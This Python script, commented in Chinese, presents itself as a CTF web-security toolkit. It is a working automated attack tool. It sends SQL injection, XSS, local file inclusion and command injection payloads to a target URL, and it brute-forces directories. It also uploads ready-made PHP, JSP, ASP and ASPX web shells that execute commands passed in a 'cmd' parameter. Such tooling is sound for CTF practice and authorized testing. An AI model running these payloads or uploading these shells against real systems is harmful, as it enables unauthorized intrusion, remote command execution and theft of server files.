#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTF Web安全常用脚本工具集
包含SQL注入、XSS、文件上传等常用攻击脚本
"""

import requests
import re
import time
import random
import string
import base64
import urllib.parse
from urllib.parse import quote, unquote
import threading
from concurrent.futures import ThreadPoolExecutor

class WebTools:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def sql_injection_test(self, url, param, payloads=None):
        """SQL注入测试脚本"""
        if payloads is None:
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' UNION SELECT 1,2,3 --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
                "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
                "' OR SLEEP(5) --",
                "' OR pg_sleep(5) --",
                "' WAITFOR DELAY '00:00:05' --"
            ]
        
        print(f"[+] Testing SQL injection on {url}")
        print(f"[+] Parameter: {param}")
        
        vulnerable = []
        for payload in payloads:
            try:
                # 记录请求时间
                start_time = time.time()
                
                # 构造请求
                data = {param: payload}
                response = self.session.post(url, data=data, timeout=10)
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # 检查SQL错误
                sql_errors = [
                    "mysql_fetch_array", "ORA-01756", "Microsoft OLE DB",
                    "PostgreSQL query failed", "SQLite/JDBCDriver",
                    "SQLServer JDBC Driver", "Oracle error", "MySQL syntax",
                    "Warning: mysql_", "valid MySQL result", "MySqlClient"
                ]
                
                error_found = any(error.lower() in response.text.lower() for error in sql_errors)
                
                # 检查时间盲注
                time_based = response_time > 4
                
                # 检查布尔盲注
                if "1=1" in payload and len(response.text) != len(self.session.post(url, data={param: "' AND 1=2 --"}).text):
                    vulnerable.append(f"Boolean-based: {payload}")
                
                if error_found:
                    vulnerable.append(f"Error-based: {payload}")
                    print(f"[!] Error-based SQL injection found: {payload}")
                
                if time_based:
                    vulnerable.append(f"Time-based: {payload}")
                    print(f"[!] Time-based SQL injection found: {payload}")
                
            except Exception as e:
                print(f"[-] Error testing payload {payload}: {e}")
        
        return vulnerable
    
    def xss_test(self, url, param, payloads=None):
        """XSS测试脚本"""
        if payloads is None:
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "'-alert('XSS')-'",
                "\";alert('XSS');//",
                "</script><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/)</script>",
                "<script>alert`XSS`</script>"
            ]
        
        print(f"[+] Testing XSS on {url}")
        print(f"[+] Parameter: {param}")
        
        vulnerable = []
        for payload in payloads:
            try:
                # GET请求测试
                get_url = f"{url}?{param}={quote(payload)}"
                response = self.session.get(get_url)
                
                if payload in response.text or payload.replace("'", "&#39;") in response.text:
                    vulnerable.append(f"Reflected XSS (GET): {payload}")
                    print(f"[!] Reflected XSS found: {payload}")
                
                # POST请求测试
                data = {param: payload}
                response = self.session.post(url, data=data)
                
                if payload in response.text or payload.replace("'", "&#39;") in response.text:
                    vulnerable.append(f"Reflected XSS (POST): {payload}")
                    print(f"[!] Reflected XSS found: {payload}")
                
            except Exception as e:
                print(f"[-] Error testing payload {payload}: {e}")
        
        return vulnerable
    
    def directory_bruteforce(self, base_url, wordlist=None):
        """目录爆破脚本"""
        if wordlist is None:
            wordlist = [
                "admin", "administrator", "login", "panel", "dashboard",
                "config", "backup", "test", "dev", "staging", "api",
                "uploads", "files", "images", "css", "js", "assets",
                "include", "inc", "lib", "src", "tmp", "temp", "cache",
                "log", "logs", "data", "db", "database", "sql", "bak",
                "old", "new", "www", "web", "site", "public", "private",
                "secret", "hidden", "internal", "external", "user",
                "users", "member", "members", "account", "accounts"
            ]
        
        print(f"[+] Directory bruteforce on {base_url}")
        found_dirs = []
        
        def check_directory(directory):
            try:
                url = f"{base_url.rstrip('/')}/{directory}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    found_dirs.append((url, response.status_code, len(response.content)))
                    print(f"[+] Found: {url} [{response.status_code}] ({len(response.content)} bytes)")
                elif response.status_code in [301, 302, 403]:
                    found_dirs.append((url, response.status_code, len(response.content)))
                    print(f"[+] Found: {url} [{response.status_code}]")
                    
            except Exception as e:
                pass
        
        # 多线程爆破
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(check_directory, wordlist)
        
        return found_dirs
    
    def file_upload_test(self, upload_url, file_param="file"):
        """文件上传测试脚本"""
        print(f"[+] Testing file upload on {upload_url}")
        
        # 测试文件类型
        test_files = {
            "php_shell.php": b"<?php system($_GET['cmd']); ?>",
            "jsp_shell.jsp": b"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
            "asp_shell.asp": b"<%eval request(\"cmd\")%>",
            "aspx_shell.aspx": b"<%@ Page Language=\"C#\" %><%Response.Write(System.Diagnostics.Process.Start(\"cmd\",\"/c \"+Request[\"cmd\"]).StandardOutput.ReadToEnd());%>",
            "test.txt": b"This is a test file",
            "test.jpg": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00",
            "test.gif": b"GIF89a\x01\x00\x01\x00\x00\x00\x00!",
            "test.png": b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x01\x00\x00\x00\x007n\xf9$\x00\x00\x00\nIDAT\x08\x1dc\xf8\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00IEND\xaeB`\x82"
        }
        
        results = []
        for filename, content in test_files.items():
            try:
                files = {file_param: (filename, content, 'application/octet-stream')}
                response = self.session.post(upload_url, files=files)
                
                if response.status_code == 200:
                    if "success" in response.text.lower() or "uploaded" in response.text.lower():
                        results.append(f"Successfully uploaded: {filename}")
                        print(f"[+] Successfully uploaded: {filename}")
                    else:
                        results.append(f"Upload response for {filename}: {response.status_code}")
                else:
                    results.append(f"Upload failed for {filename}: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error uploading {filename}: {e}")
        
        return results
    
    def lfi_test(self, url, param, payloads=None):
        """本地文件包含测试脚本"""
        if payloads is None:
            payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd%00",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://whoami",
                "/proc/self/environ",
                "/proc/version",
                "/proc/cmdline"
            ]
        
        print(f"[+] Testing LFI on {url}")
        print(f"[+] Parameter: {param}")
        
        vulnerable = []
        for payload in payloads:
            try:
                # GET请求测试
                test_url = f"{url}?{param}={quote(payload)}"
                response = self.session.get(test_url)
                
                # 检查Linux文件特征
                if "root:x:0:0:" in response.text or "daemon:" in response.text:
                    vulnerable.append(f"LFI (Linux): {payload}")
                    print(f"[!] LFI vulnerability found: {payload}")
                
                # 检查Windows文件特征
                if "# Copyright (c) 1993-2009 Microsoft Corp." in response.text:
                    vulnerable.append(f"LFI (Windows): {payload}")
                    print(f"[!] LFI vulnerability found: {payload}")
                
                # 检查PHP代码
                if "<?php" in response.text and "?>" in response.text:
                    vulnerable.append(f"Source code disclosure: {payload}")
                    print(f"[!] Source code disclosure found: {payload}")
                
            except Exception as e:
                print(f"[-] Error testing payload {payload}: {e}")
        
        return vulnerable
    
    def command_injection_test(self, url, param, payloads=None):
        """命令注入测试脚本"""
        if payloads is None:
            payloads = [
                "; whoami",
                "| whoami",
                "&& whoami",
                "|| whoami",
                "`whoami`",
                "$(whoami)",
                "; id",
                "| id",
                "&& id",
                "|| id",
                "`id`",
                "$(id)",
                "; sleep 5",
                "| sleep 5",
                "&& sleep 5",
                "|| sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; ping -c 4 127.0.0.1",
                "| ping -c 4 127.0.0.1",
                "&& ping -c 4 127.0.0.1",
                "|| ping -c 4 127.0.0.1"
            ]
        
        print(f"[+] Testing command injection on {url}")
        print(f"[+] Parameter: {param}")
        
        vulnerable = []
        for payload in payloads:
            try:
                start_time = time.time()
                
                # POST请求测试
                data = {param: f"test{payload}"}
                response = self.session.post(url, data=data, timeout=10)
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # 检查命令执行结果
                if "uid=" in response.text and "gid=" in response.text:
                    vulnerable.append(f"Command injection: {payload}")
                    print(f"[!] Command injection found: {payload}")
                
                # 检查时间延迟
                if "sleep" in payload and response_time > 4:
                    vulnerable.append(f"Time-based command injection: {payload}")
                    print(f"[!] Time-based command injection found: {payload}")
                
                # 检查ping命令
                if "ping" in payload and ("64 bytes from" in response.text or "PING" in response.text):
                    vulnerable.append(f"Network command injection: {payload}")
                    print(f"[!] Network command injection found: {payload}")
                
            except Exception as e:
                print(f"[-] Error testing payload {payload}: {e}")
        
        return vulnerable
    
    def generate_payloads(self, payload_type, custom_params=None):
        """生成各种类型的Payload"""
        payloads = {}
        
        if payload_type == "xss":
            payloads["basic"] = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ]
            payloads["bypass"] = [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/)</script>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>"
            ]
            
        elif payload_type == "sqli":
            payloads["union"] = [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT null,null,null--",
                "' UNION SELECT @@version,2,3--"
            ]
            payloads["boolean"] = [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR '1'='1"
            ]
            payloads["time"] = [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--"
            ]
            
        elif payload_type == "lfi":
            payloads["linux"] = [
                "../../../etc/passwd",
                "/etc/passwd",
                "....//....//....//etc/passwd"
            ]
            payloads["windows"] = [
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "C:\\windows\\system32\\drivers\\etc\\hosts"
            ]
            payloads["php"] = [
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
            ]
        
        return payloads

def main():
    """主函数 - 演示用法"""
    tools = WebTools()
    
    print("CTF Web安全工具集")
    print("=" * 50)
    
    # 示例用法
    target_url = "http://example.com/login.php"
    
    print("\n1. SQL注入测试示例:")
    print(f"tools.sql_injection_test('{target_url}', 'username')")
    
    print("\n2. XSS测试示例:")
    print(f"tools.xss_test('{target_url}', 'search')")
    
    print("\n3. 目录爆破示例:")
    print(f"tools.directory_bruteforce('http://example.com')")
    
    print("\n4. 文件上传测试示例:")
    print(f"tools.file_upload_test('http://example.com/upload.php')")
    
    print("\n5. LFI测试示例:")
    print(f"tools.lfi_test('http://example.com/page.php', 'file')")
    
    print("\n6. 命令注入测试示例:")
    print(f"tools.command_injection_test('{target_url}', 'cmd')")
    
    print("\n7. Payload生成示例:")
    xss_payloads = tools.generate_payloads("xss")
    print("XSS Payloads:", xss_payloads)

if __name__ == "__main__":
    main()
